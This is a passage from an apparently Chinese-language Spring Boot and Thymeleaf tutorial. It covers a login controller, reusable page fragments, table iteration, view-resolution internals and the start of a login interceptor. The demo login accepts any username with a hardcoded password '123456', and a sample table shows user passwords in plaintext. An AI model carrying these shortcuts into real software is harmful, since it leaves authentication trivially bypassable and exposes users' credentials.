class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 来登录页</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(value = &#123;&quot;/&quot;,&quot;/login&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">loginPage</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">main</span><span class="hljs-params">(User user, HttpSession session, Model model)</span>&#123; <span class="hljs-comment">//RedirectAttributes</span><br><br>        <span class="hljs-keyword">if</span>(StringUtils.hasLength(user.getUserName()) &amp;&amp; <span class="hljs-string">&quot;123456&quot;</span>.equals(user.getPassword()))&#123;<br>            <span class="hljs-comment">//把登陆成功的用户保存起来</span><br>            session.setAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>,user);<br>            <span class="hljs-comment">//登录成功重定向到main.html;  重定向防止表单重复提交</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/main.html&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;账号密码错误&quot;</span>);<br>            <span class="hljs-comment">//回到登录页面</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>     <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 去main页面</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/main.html&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">mainPage</span><span class="hljs-params">(HttpSession session, Model model)</span>&#123;<br>        <br>        <span class="hljs-comment">//最好用拦截器,过滤器</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">loginUser</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>);<br>        <span class="hljs-keyword">if</span>(loginUser != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;main&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//session过期，没有登陆过</span><br>        <span class="hljs-comment">//回到登录页面</span><br>        model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;请重新登录&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> String password;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="45、web实验-抽取公共页面"><a href="#45、web实验-抽取公共页面" class="headerlink" title="45、web实验-抽取公共页面"></a>45、web实验-抽取公共页面</h2><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#template-layout">官方文档 - Template Layout</a></p><ul><li>公共页面<code>/templates/common.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--注意要添加xmlns:th才能添加thymeleaf的标签--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;commonheader&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--common--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/css/style.css&#125;&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style-responsive.css&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/css/style-responsive.css&#125;&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- left side start--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;leftmenu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;left-side sticky-left-side&quot;</span>&gt;</span><br>...<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;left-side-inner&quot;</span>&gt;</span><br>...<br><br>        <span class="hljs-comment">&lt;!--sidebar nav start--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills nav-stacked custom-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/main.html&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-home&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Dashboard<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;menu-list nav-active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-th-list&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Data Tables<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sub-menu-list&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/basic_table&#125;&quot;</span>&gt;</span> Basic Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/dynamic_table&#125;&quot;</span>&gt;</span> Advanced Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/responsive_table&#125;&quot;</span>&gt;</span> Responsive Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/editable_table&#125;&quot;</span>&gt;</span> Edit Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--sidebar nav end--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-comment">&lt;!-- left side end--&gt;</span><br><br><br><span class="hljs-comment">&lt;!-- header section start--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;headermenu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;header-section&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--toggle button start--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;toggle-btn&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-bars&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--toggle button end--&gt;</span><br>...<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-comment">&lt;!-- header section end--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;commonscript&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Placed js at the end of the document so the pages load faster --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery-1.10.2.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery-ui-1.9.2.custom.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery-migrate-1.2.1.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/bootstrap.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/modernizr.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery.nicescroll.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--common scripts for all pages--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/scripts.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>/templates/table/basic_table.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ThemeBucket&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/png&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Basic Table<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:include</span>=<span class="hljs-string">&quot;common :: commonheader&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!--将common.html的代码段 插进来--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sticky-header&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:replace</span>=<span class="hljs-string">&quot;common :: #leftmenu&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!-- main content start--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;main-content&quot;</span> &gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:replace</span>=<span class="hljs-string">&quot;common :: headermenu&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- main content end--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Placed js at the end of the document so the pages load faster --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:replace</span>=<span class="hljs-string">&quot;common :: #commonscript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#difference-between-thinsert-and-threplace-and-thinclude">Difference between <code>th:insert</code> and <code>th:replace</code> (and <code>th:include</code>)</a></p><h2 id="46、web实验-遍历数据与页面bug修改"><a href="#46、web实验-遍历数据与页面bug修改" class="headerlink" title="46、web实验-遍历数据与页面bug修改"></a>46、web实验-遍历数据与页面bug修改</h2><p>控制层代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/dynamic_table&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">dynamic_table</span><span class="hljs-params">(Model model)</span>&#123;<br>    <span class="hljs-comment">//表格内容的遍历</span><br>    List&lt;User&gt; users = Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>),<br>                                     <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;lisi&quot;</span>, <span class="hljs-string">&quot;123444&quot;</span>),<br>                                     <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;haha&quot;</span>, <span class="hljs-string">&quot;aaaaa&quot;</span>),<br>                                     <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;hehe &quot;</span>, <span class="hljs-string">&quot;aaddd&quot;</span>));<br>    model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,users);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;table/dynamic_table&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;display table table-bordered&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hidden-table-info&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>#<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;gradeX&quot;</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user,stats:$&#123;users&#125;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;stats.count&#125;&quot;</span>&gt;</span>Trident<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.userName&#125;&quot;</span>&gt;</span>Internet<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> &gt;</span>[[$&#123;user.password&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="47、视图解析-【源码分析】-视图解析器与视图"><a href="#47、视图解析-【源码分析】-视图解析器与视图" class="headerlink" title="47、视图解析-【源码分析】-视图解析器与视图"></a>47、视图解析-【源码分析】-视图解析器与视图</h2><p><strong>视图解析原理流程</strong>：</p><ol><li><p>目标方法处理的过程中（阅读<code>DispatcherServlet</code>源码），所有数据都会被放在 <code>ModelAndViewContainer</code> 里面，其中包括数据和视图地址。</p></li><li><p>方法的参数是一个自定义类型对象（从请求参数中确定的），把他重新放在 <code>ModelAndViewContainer</code> 。</p></li><li><p>任何目标方法执行完成以后都会返回<code>ModelAndView</code>（数据和视图地址）。</p></li><li><p><code>processDispatchResult()</code>处理派发结果（页面改如何响应）</p><ul><li><p><code>render(mv, request, response);</code> 进行页面渲染逻辑</p><ul><li>根据方法的<code>String</code>返回值得到 <code>View</code> 对象【定义了页面的渲染逻辑】</li></ul><ol><li>所有的视图解析器尝试是否能根据当前返回值得到<code>View</code>对象</li><li>得到了  <code>redirect:/main.html --&gt; Thymeleaf new RedirectView()</code>。</li><li><code>ContentNegotiationViewResolver</code> 里面包含了下面所有的视图解析器，内部还是利用下面所有视图解析器得到视图对象。</li><li><code>view.render(mv.getModelInternal(), request, response);</code>  视图对象调用自定义的render进行页面渲染工作。</li></ol><ul><li><code>RedirectView</code> 如何渲染【重定向到一个页面】</li><li>获取目标url地址</li><li><code>response.sendRedirect(encodedURL);</code></li></ul></li></ul></li></ol><p><strong>视图解析</strong>：<br>    - 返回值以 <code>forward:</code> 开始： <code>new InternalResourceView(forwardUrl);</code> –&gt;  转发<code>request.getRequestDispatcher(path).forward(request, response);</code><br>    - 返回值以 <code>redirect:</code> 开始： <code>new RedirectView()</code> –&gt; render就是重定向<br>    - 返回值是普通字符串：<code>new ThymeleafView()</code>—&gt;</p><hr><p>阅读源码：最好自己在IDE，打断点，且Debug模式运行实例，这样比较没那么沉闷。</p><h2 id="48、拦截器-登录检查与静态资源放行"><a href="#48、拦截器-登录检查与静态资源放行" class="headerlink" title="48、拦截器-登录检查与静态资源放行"></a>48、拦截器-登录检查与静态资源放行</h2><ol><li><p>编写一个拦截器实现<code>HandlerInterceptor</code>接口</p></li><li><p>拦截器注册到容器中（实现<code>WebMvcConfigurer</code>的<code>addInterceptors()</code>）</p></li><li><p>指定拦截规则（<span style="color:red;">注意</span>，如果是拦截所有，静态资源也会被拦截】</p></li></ol><p>编写一个实现<code>HandlerInterceptor</code>接口的拦截器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 目标方法执行之前</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>        log.info(<span class="hljs-string">&quot;preHandle拦截的请求路径是&#123;&#125;&quot;</span>,requestURI);<br><br>        <span class="hljs-comment">//登录检查逻辑</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">loginUser</span> <span class="hljs-operator">=</span> 